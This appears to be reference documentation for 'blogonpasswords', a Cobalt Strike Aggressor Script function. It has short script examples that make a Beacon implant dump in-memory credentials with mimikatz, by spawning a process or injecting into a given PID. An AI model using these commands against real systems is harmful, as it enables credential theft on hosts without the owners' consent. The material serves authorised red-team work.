blogonpasswords

Ask Beacon to dump in-memory credentials with mimikatz. This function requires administrator privileges.

#### Arguments

`$1` - the id for the beacon. This may be an array or a single ID.

`$2 `- (optional) the PID to inject the logonpasswords command into or $null

`$3 `- (optional) the architecture of the target PID (x86|x64) or $null

#### Example

Spawn a temporary process```
item "Dump &Passwords" {
   binput($1, "logonpasswords");
   blogonpasswords($1);
}```

Inject into the specified process```
beacon_command_register(
   "logonpasswords_inject",
   "Inject into a process and dump in-memory credentials with mimikatz",
   "Usage: logonpasswords_inject [pid] [arch]");

alias logonpasswords_inject {
   blogonpasswords($1, $2, $3);
}```
